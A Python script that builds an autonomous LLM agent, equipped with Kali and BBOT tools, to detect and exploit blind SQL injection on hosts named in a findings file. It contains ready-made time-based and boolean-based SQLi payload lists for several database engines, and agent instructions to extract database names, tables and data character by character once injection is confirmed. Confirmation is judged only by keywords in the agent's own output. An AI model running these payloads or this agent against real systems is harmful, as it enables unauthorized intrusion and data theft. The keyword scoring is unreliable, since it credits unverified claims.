import argparse
import asyncio
import json
import time
import typing as t
from pathlib import Path

from rich.console import Console

import dreadnode as dn
from dreadnode.agent.agent import Agent
from dreadnode.agent.result import AgentResult
from dreadnode.agent.tools.bbot.tool import BBotTool
from dreadnode.agent.tools.kali.tool import KaliTool
from dreadnode.agent.tools.neo4j.tool import Neo4jTool
from dreadnode.agent.tools.oast.tool import OastTool

dn.configure(server=None, token=None, project="blind-sqli-agent", console=False)

console = Console()

# Blind SQLi focused payloads
TIME_BASED_PAYLOADS = [
    # MySQL time-based
    "' AND SLEEP(5)--",
    "' AND (SELECT SLEEP(5))--",
    "' AND IF(1=1,SLEEP(5),0)--",
    "' OR SLEEP(5)--",
    "'; WAITFOR DELAY '00:00:05'--",
    
    # PostgreSQL time-based
    "'; SELECT pg_sleep(5)--",
    "' AND 1=(SELECT pg_sleep(5))--",
    "' OR pg_sleep(5) IS NULL--",
    
    # MSSQL time-based
    "'; WAITFOR DELAY '0:0:5'--",
    "' AND 1=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7,sysusers AS sys8)--",
    
    # Oracle time-based
    "' AND DBMS_LOCK.SLEEP(5) IS NULL--",
    "' AND 1=(SELECT COUNT(*) FROM all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",
    
    # Generic heavy queries
    "' AND (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)>0--",
]

BOOLEAN_BASED_PAYLOADS = [
    # Basic boolean tests
    "' AND 1=1--",
    "' AND 1=2--",
    "' OR 1=1--",
    "' OR 1=2--",
    
    # Substring/length tests for data extraction
    "' AND LENGTH(DATABASE())>0--",
    "' AND LENGTH(DATABASE())=8--",
    "' AND SUBSTRING(DATABASE(),1,1)='a'--",
    "' AND ASCII(SUBSTRING(DATABASE(),1,1))>97--",
    
    # Version detection
    "' AND @@version LIKE '%MySQL%'--",
    "' AND version() LIKE '%PostgreSQL%'--",
    "' AND @@version LIKE '%Microsoft%'--",
    
    # Table existence tests
    "' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='users')>0--",
    "' AND EXISTS(SELECT * FROM information_schema.tables WHERE table_name='admin')--",
]

@dn.task(name="Blind SQLi Analysis", label="analyze_blind_sqli")
async def analyze_blind_sqli(finding_data: dict) -> dict:
    """Analyze a finding specifically for blind SQL injection."""
    agent = create_blind_sqli_agent()
    
    url = finding_data.get('data', {}).get('url', '')
    host = finding_data.get('data', {}).get('host', '')
    description = finding_data.get('data', {}).get('description', '')
    
    param_name = extract_param_name(description)
    original_value = extract_original_value(description)
    
    console.print(f"[*] Testing BLIND SQL injection on {host}")
    console.print(f"    URL: {url}")
    console.print(f"    Parameter: {param_name}")
    
    # Build focused prompt with blind-specific context
    prompt = f"""Target: {url}
Parameter: {param_name}
Original Value: {original_value}

MISSION: Test this parameter specifically for BLIND SQL injection vulnerabilities.

BLIND SQLI METHODOLOGY:
1. TIME-BASED DETECTION:
   - Test SLEEP/WAITFOR DELAY payloads
   - Measure response times carefully
   - Confirm delays are consistent with payload timing
   - Rule out network latency issues

2. BOOLEAN-BASED DETECTION:
   - Test true/false conditions (1=1 vs 1=2)
   - Compare response lengths, status codes, content
   - Look for subtle differences in responses
   - Identify application behavior patterns

3. DATA EXTRACTION (if blind SQLi confirmed):
   - Use substring/length functions for enumeration
   - Extract database name, version, tables
   - Character-by-character data extraction
   - Binary search optimization for efficiency

Focus ONLY on blind techniques. No error messages expected - rely on timing and response analysis.

Test payloads systematically and document timing/response differences precisely."""

    result = await agent.run(prompt)
    
    # Process results with blind-specific logic
    has_time_based = analyze_timing_responses(result)
    has_boolean_based = analyze_boolean_responses(result)
    has_blind_sqli = has_time_based or has_boolean_based
    
    technique = []
    if has_time_based:
        technique.append("time-based")
    if has_boolean_based:
        technique.append("boolean-based")
    
    dn.log_metric("blind_sqli_found", 1 if has_blind_sqli else 0)
    dn.log_metric("time_based_sqli", 1 if has_time_based else 0)
    dn.log_metric("boolean_based_sqli", 1 if has_boolean_based else 0)
    
    return {
        "url": url,
        "host": host,
        "parameter": param_name,
        "vulnerability_type": "blind_sqli",
        "has_sqli": has_blind_sqli,
        "techniques": technique,
        "analysis": result.messages[-1].content if result.messages else None,
        "detection_method": "timing_and_response_analysis"
    }

def analyze_timing_responses(result: AgentResult) -> bool:
    """Analyze agent responses for time-based blind SQLi indicators."""
    if not result.messages:
        return False
    
    content = ' '.join([msg.content for msg in result.messages if msg.content]).lower()
    
    # Check for time-based SQLi success indicators
    timing_indicators = [
        'sleep delay detected',
        'response time increased',
        'timing difference',
        'delay confirmed',
        'waitfor delay success',
        'pg_sleep detected',
        'dbms_lock.sleep',
        'consistent delay',
        'timing attack successful',
        'time-based injection',
        'response delayed by',
        'sleep function executed'
    ]
    
    return any(indicator in content for indicator in timing_indicators)

def analyze_boolean_responses(result: AgentResult) -> bool:
    """Analyze agent responses for boolean-based blind SQLi indicators."""
    if not result.messages:
        return False
    
    content = ' '.join([msg.content for msg in result.messages if msg.content]).lower()
    
    # Check for boolean-based SQLi success indicators
    boolean_indicators = [
        'true condition response',
        'false condition response',
        'response length difference',
        'content difference detected',
        'boolean injection confirmed',
        'conditional response',
        'true/false comparison',
        'response pattern difference',
        'boolean-based injection',
        'condition evaluation',
        'differential response',
        'logical condition test'
    ]
    
    return any(indicator in content for indicator in boolean_indicators)

def create_blind_sqli_agent() -> Agent:
    """Create a blind SQL injection specialist agent."""
    tools = [KaliTool(), BBotTool(), Neo4jTool()]
    
    blind_sqli_context = """
BLIND SQL INJECTION SPECIALIST

You are an expert focused EXCLUSIVELY on blind SQL injection techniques.

Your mission is to detect and exploit SQL injection through timing and response analysis - no error messages expected.

Start with reconnaissance and build your approach based on what you observe:

1. BASELINE ESTABLISHMENT: Make several normal requests to understand typical response times and patterns
2. TIME-BASED DETECTION: Test if you can control execution timing through SQL delays
3. BOOLEAN-BASED DETECTION: Test if you can influence application responses through true/false conditions
4. PROGRESSIVE EXTRACTION: Once you confirm blind SQLi, extract data character-by-character

Adapt your techniques based on the application's behavior. Some applications respond to timing attacks, others to content-length differences, others to subtle page changes.

The key is methodical testing and careful response analysis. Let the application tell you what works.

Use the http_request tool systematically. Document timing patterns and response variations precisely.
"""

    return Agent(
        name="blind-sqli-agent",
        description="Specialized agent for blind SQL injection detection and exploitation",
        model="gpt-4-turbo",
        tools=tools,
        instructions=blind_sqli_context,
    )

def extract_param_name(description: str) -> str:
    """Extract parameter name from BBOT finding description."""
    if "Name: [" in description:
        start = description.find("Name: [") + 7
        end = description.find("]", start)
        return description[start:end] if end > start else "unknown"
    return "unknown"

def extract_original_value(description: str) -> str:
    """Extract original parameter value from BBOT finding description."""
    if "Original Value: [" in description:
        start = description.find("Original Value: [") + 17
        end = description.rfind("]")
        return description[start:end] if end > start else ""
    return ""

async def main():
    parser = argparse.ArgumentParser(description="Blind SQL injection specialist")
    parser.add_argument("finding_file", type=Path, help="JSON file containing SQLi findings")
    parser.add_argument("--debug", action="store_true", help="Debug mode")
    
    args = parser.parse_args()
    
    with dn.run("blind-sqli-hunt"):
        console.print("Starting BLIND SQL injection analysis...")
        
        try:
            with open(args.finding_file) as f:
                findings = json.load(f)
            
            if not isinstance(findings, list):
                findings = [findings]
            
            confirmed_count = 0
            time_based_count = 0
            boolean_based_count = 0
            
            for finding in findings:
                analysis_result = await analyze_blind_sqli(finding)
                
                if analysis_result["has_sqli"]:
                    confirmed_count += 1
                    techniques = analysis_result["techniques"]
                    console.print(f"[+] BLIND SQLi CONFIRMED: {analysis_result['host']}")
                    console.print(f"    Techniques: {', '.join(techniques)}")
                    
                    if "time-based" in techniques:
                        time_based_count += 1
                    if "boolean-based" in techniques:
                        boolean_based_count += 1
                else:
                    console.print(f"[-] No blind SQLi: {finding.get('data', {}).get('host')}")
            
            dn.log_metric("total_blind_sqli_confirmed", confirmed_count)
            dn.log_metric("time_based_confirmed", time_based_count)
            dn.log_metric("boolean_based_confirmed", boolean_based_count)
            
            console.print(f"\nBlind SQLi Summary:")
            console.print(f"  Total confirmed: {confirmed_count}")
            console.print(f"  Time-based: {time_based_count}")
            console.print(f"  Boolean-based: {boolean_based_count}")
            
        except Exception as e:
            console.print(f"Error: {e}")

if __name__ == "__main__":
    asyncio.run(main())